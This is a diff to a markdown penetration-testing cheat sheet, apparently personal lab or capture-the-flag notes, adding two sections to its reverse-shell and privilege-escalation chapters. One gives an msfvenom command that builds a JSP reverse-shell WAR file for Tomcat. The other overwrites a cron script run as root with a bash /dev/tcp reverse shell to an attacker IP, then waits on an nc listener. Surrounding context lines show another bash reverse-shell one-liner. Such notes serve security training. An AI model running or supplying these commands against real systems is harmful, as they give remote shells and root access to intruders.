@@ -12,6 +12,7 @@
     - [Web/HTTP](#webhttp)
 - [Reverse Shells](#reverse-shells)
   - [Bash Reverse Shell](#bash-reverse-shell)
+  - [Msfvenom JSP WAR Reverse Shell](#msfvenom-jsp-war-reverse-shell)
 - [Remote Access](#remote-access)
   - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
 - [Privilege Escalation](#privilege-escalation)
@@ -19,6 +20,7 @@
     - [SUID Files](#suid-files)
     - [Linux Capabilities](#linux-capabilities)
     - [Cron Jobs](#cron-jobs)
+    - [Overwrite Writable Cron Script](#overwrite-writable-cron-script)
     - [Writable Directories](#writable-directories)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
@@ -420,6 +422,20 @@ bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
 * Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
 * Works on systems with bash and `/dev/tcp` support (most Linux systems)
 
+### Msfvenom JSP WAR Reverse Shell
+
+* **Msfvenom JSP/WAR reverse shell** - Builds a `.war` web archive containing a JSP reverse TCP payload (e.g. Tomcat deployment)
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o reverse.war
+```
+
+* `-p java/jsp_shell_reverse_tcp`: JSP reverse TCP shell payload
+* `LHOST` / `LPORT`: Your listener IP and port
+* `-f war`: Output as a WAR file for Java servlet containers
+* `-o reverse.war`: Output filename
+* Start a listener before the app runs the payload (e.g. `nc -lvnp <PORT>`), then deploy or trigger the WAR as the scenario allows
+
 ---
 
 ## Remote Access
@@ -559,6 +575,24 @@ ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
 * Shows detailed file permissions, ownership, and timestamps
 * Helps identify which cron jobs run as root and which scripts they execute
 * Look for scripts in directories you have write access to (e.g., `/tmp`, `/var/tmp`, user home directories)
+
+#### Overwrite Writable Cron Script
+
+If a cron job runs a script you can write to:
+
+```bash
+# Check permissions
+ls -la /home/user/script.sh
+
+# Overwrite with reverse shell (use echo, NOT vi)
+echo '#!/bin/bash' > /home/user/script.sh
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /home/user/script.sh
+
+# Start listener and wait for cron execution
+nc -lvnp <PORT>
+```
+
+Note: use `>>` to append, `>` to overwrite.
 
 #### Writable Directories
 
